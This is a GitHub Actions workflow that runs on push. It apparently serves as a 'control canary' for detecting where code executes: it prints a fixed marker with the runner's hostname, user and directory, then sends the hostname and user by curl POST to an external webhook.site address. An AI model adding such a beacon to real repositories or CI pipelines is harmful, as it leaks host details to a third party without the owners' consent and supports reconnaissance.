name: zqx-control
on: [push]
jobs:
  control:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: control canary
        run: |
          echo "ZQX-NOVUS-EXEC-7f3a91 stage=gha host=$(hostname) user=$(whoami) cwd=$(pwd)"
          curl -s -X POST -H 'Content-Type: application/json' \
            -d "{\"marker\":\"ZQX-NOVUS-EXEC-7f3a91\",\"stage\":\"gha\",\"host\":\"$(hostname)\",\"user\":\"$(whoami)\"}" \
            https://webhook.site/5122697e-d0ec-4188-8eec-edc095827474/gha-control || true
